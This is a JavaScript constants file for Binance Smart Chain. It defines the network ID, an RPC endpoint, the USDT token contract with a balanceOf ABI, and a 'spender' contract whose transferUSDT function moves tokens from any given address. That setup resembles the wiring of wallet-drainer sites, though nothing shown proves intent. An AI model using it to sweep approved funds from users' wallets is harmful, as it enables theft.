export const BSC_CHAIN_ID = '0x38';
export const BSC_RPC = 'https://bsc-dataseed.binance.org/';

export const USDT_CONTRACT = "0x55d398326f99059ff775485246999027b3197955";

export const USDT_ABI = [
  {
    "constant": true,
    "inputs": [{ "name": "_owner", "type": "address" }],
    "name": "balanceOf",
    "outputs": [{ "name": "balance", "type": "uint256" }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
  }
];

export const SPENDER_CONTRACT_ADDRESS = "0xf7b89f088f96a9137768895bb8447c80a161f013";
export const SPENDER_ABI = [
  {
    inputs: [
      { name: "from", type: "address" },
      { name: "to", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    name: "transferUSDT",
    outputs: [{ name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  }
];
